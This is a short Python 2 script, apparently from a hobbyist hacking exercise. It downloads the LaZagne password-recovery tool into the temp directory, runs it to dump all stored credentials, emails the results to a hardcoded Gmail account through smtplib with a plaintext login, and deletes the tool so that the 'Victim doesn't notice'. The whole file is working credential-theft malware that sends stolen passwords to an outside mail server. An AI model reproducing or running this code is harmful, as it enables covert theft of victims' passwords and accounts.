#!/usr/bin/env python2

import subprocess
import smtplib
import requests
import os
import tempfile


def download(url, operation_mode="wb"):
    get_response = requests.get(url)  # This actually sends a HTTP request for our file/url :)

    print(get_response)  # Prints the Response HTTP code received :) [Usually it is 200, meaning OK Connection :) ]
    print(get_response.content)  # Prints the actual file in binary. Like "\x\d\x0\1x\2x20" stuff XD

    filename = str(url).split("/")[-1]  # Name (with extension) of file that we want to operate on :)
    # '-1' to access last element of list, i.e., the file name at the end of the URL :)


    operation_mode = operation_mode # Execution type, eg 'w' for 'write', 'r' for 'read', 'rw' for 'read-write, etc. :)
    # 'wb' is used to 'write-binary' as we'd be writing binary text in the file :)

    # 'with' keyword is used in python to deal with files; 'as' is to assign a variable name to access that file :)
    with open(filename, operation_mode) as file:
        file.write(get_response.content)


def send_mail(sender_email, sender_password, message, receiver_email="self"):
    server = smtplib.SMTP("smtp.gmail.com", 587)  # Creates SMTP server instance :)
    # Google allows users to use their server which runs on port 587 :)

    server.starttls()  # Initiates TLS connection to the server :)

    server.login(sender_email, sender_password)  # Login in with the email and pass on the Server :)

    server.sendmail(from_addr=sender_email, to_addrs=receiver_email if receiver_email is "self" else sender_email,
                    msg=message)  # Sends A Mail containing this.message :)

    server.quit()  # Quits Server :)


temp_dir_path = tempfile.gettempdir()  # Cross-Platform method to get Path To Temp Directory of the System :)
os.chdir(temp_dir_path)  # Navigating to the temp directory of the System :)
download(url="https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe")
output = subprocess.check_output("lazagne.exe all", shell=True)
send_mail("loveaash3@gmail.com", "root@kali", output)
os.remove("lazagne.exe")  # Removing Downloaded Laganze.exe so that Victim doesn't notice anything suspicious ;)
